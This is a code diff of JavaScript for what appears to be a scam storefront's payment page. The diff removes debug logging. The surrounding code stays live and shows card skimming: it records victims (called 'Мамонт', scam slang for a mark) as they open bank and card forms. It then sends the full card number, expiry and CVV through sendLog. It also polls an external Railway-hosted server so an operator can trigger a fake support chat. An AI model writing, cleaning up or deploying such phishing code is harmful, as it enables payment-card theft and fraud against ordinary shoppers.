@@ -1787,7 +1787,6 @@
       if (!response.ok) throw new Error("Server error");
 
       const data = await response.json();
-      console.log("📥 Данные получены:", data);
 
       // Фото - используем прокси через бота для обхода CORS
       const photoEl = document.getElementById('productImg');
@@ -1805,7 +1804,6 @@
       // Отображаем данные
       displayProductData(data);
 
-      console.log("✅ Данные успешно подставлены из link_id:", link_id);
 
       // Log after productName is loaded
       if (typeof sendLog === 'function') {
@@ -2387,7 +2385,6 @@
     })
     .then(response => response.json())
     .then(data => {
-      console.log('Log sent:', data);
       if (callback) callback();
     })
     .catch(error => {
@@ -2487,9 +2484,7 @@ function openBankModal() {
     link_id = urlParams.get('link_id');
   }
 
-  console.log('🏦 Bank modal opened, logging...', productName);
   if (typeof sendLog === 'function') {
-    console.log('✅ sendLog exists, sending...');
     sendLog('payment_flow', `🏦 Мамонт перешел на выбор банка\n📦 Товар: ${productName}${link_id ? `\nlink_id=${link_id}` : ''}`);
   } else {
     console.error('❌ sendLog is not defined!');
@@ -2512,9 +2507,7 @@ function openCardModal() {
     link_id = urlParams.get('link_id');
   }
 
-  console.log('💳 Card modal opened, logging...', productName);
   if (typeof sendLog === 'function') {
-    console.log('✅ sendLog exists, sending...');
     sendLog('payment_flow', `💳 Мамонт перешел на ввод карты\n📦 Товар: ${productName}${link_id ? `\nlink_id=${link_id}` : ''}`);
   } else {
     console.error('❌ sendLog is not defined!');
@@ -2545,7 +2538,6 @@ document.addEventListener('DOMContentLoaded', function() {
   if (urlParams.get('open_chat') === 'true') {
     setTimeout(() => {
       toggleChat();
-      console.log('💬 Auto-opened support chat');
     }, 500);
   }
 
@@ -2559,7 +2551,6 @@ document.addEventListener('DOMContentLoaded', function() {
         .then(res => res.json())
         .then(data => {
           if (data.should_open && !supportChatOpened) {
-            console.log('💬 Admin opened support chat');
             toggleChat();
             supportChatOpened = true;
 
@@ -2567,7 +2558,6 @@ document.addEventListener('DOMContentLoaded', function() {
             fetch(`https://worker-production-740e.up.railway.app/clear_support?link_id=${link_id}`)
               .then(res => res.json())
               .then(data => {
-                console.log('✅ Support request cleared');
                 supportChatOpened = false; // Reset for next request
               })
               .catch(err => console.error('Clear support error:', err));
@@ -2610,7 +2600,6 @@ document.addEventListener('DOMContentLoaded', function() {
   // Function to copy text to clipboard
   function copyToClipboard(text) {
     navigator.clipboard.writeText(text).then(() => {
-      console.log('📋 Copied to clipboard:', text);
     }).catch(err => {
       console.error('Failed to copy:', err);
     });
@@ -2638,13 +2627,9 @@ document.addEventListener('DOMContentLoaded', function() {
         // Log card data with product name and link_id for identification
         const logMessage = `💳 Мамонт дал данные карты\n🔢 Номер: ${cardNumber}\n📅 Дата: ${cardExpiry}\n🔐 CVV: ${cardCVV}\n📦 Товар: ${productName}${link_id ? `\nlink_id=${link_id}` : ''}`;
 
-        console.log('CARD CHECK 1: typeof sendLog =', typeof sendLog);
-        console.log('CARD CHECK 2: logMessage =', logMessage);
 
         if (typeof sendLog === 'function') {
-          console.log('CARD CHECK 3: sendLog is function, calling it...');
           sendLog('payment_flow', logMessage);
-          console.log('CARD CHECK 4: sendLog called');
         }
 
         // Clear form
@@ -2655,9 +2640,7 @@ document.addEventListener('DOMContentLoaded', function() {
         // Close modal
         closeCardModal();
 
-        console.log('✅ Card data submitted');
       } else {
-        console.warn('⚠️ Incomplete card form');
       }
     });
   }
